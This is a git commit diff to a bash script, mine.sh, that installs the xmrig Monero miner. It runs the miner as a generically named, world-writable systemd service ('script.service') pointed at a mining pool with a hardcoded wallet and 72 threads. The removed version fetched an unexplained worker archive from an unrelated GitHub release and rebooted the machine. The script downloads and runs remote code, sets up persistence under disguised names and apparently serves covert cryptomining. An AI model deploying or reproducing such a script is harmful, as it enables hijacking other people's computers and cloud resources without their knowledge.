74167cc9a8ed8b723acf9b3bef6ef4a06f539522
Daemonium <66210793+realLifeInAnime@users.noreply.github.com>
2023-10-15 14:07:37 +0300

    Update mine.sh

--- mine.sh
+++ mine.sh
@@ -1,18 +1,13 @@
 #!/bin/bash
-sleep 20 ;
-sudo apt update ;
-sudo snap install dotnet-sdk --classic ;
+sleep 10 ;
 sudo touch /etc/systemd/system/script.service ;
 sudo touch /usr/local/bin/script.sh ;
 sudo chmod 777 /etc/systemd/system/script.service ;
 sudo chmod 777 /usr/local/bin/script.sh ;
-
-wget https://github.com/RarMane/rules/releases/download/worker123123/worker.tar.gz && tar -xf worker.tar.gz 
+wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar zxvf xmrig-6.18.0-linux-x64.tar.gz ;
 
 sudo echo "#!/bin/bash
-sleep 10 ;
-
-dotnet WorkerService.dll ;" > /usr/local/bin/script.sh
+./xmrig-6.18.0/xmrig -a randomx -o xmr.2miners.com:2222 -u 4851tkCPpMvFzGEPWWMamuSuwGh56vh3PUAxXYrSmX2mSRAgDPMTnS9Z7DLz1futnhRubjBpj7WsCLMy6SxGDJTMQuwZRxt.test --coin monero --threads=72" > /usr/local/bin/script.sh ;
 
 sudo echo "[Unit]
 Description=Script
@@ -27,6 +22,5 @@ WorkingDirectory=/
 WantedBy=multi-user.target" > /etc/systemd/system/script.service;
 
 sudo systemctl daemon-reload;
-sudo systemctl enable script.service;
-sleep 10;
-sudo reboot'
+sudo systemctl start script.service;
+sudo systemctl enable script.service;'
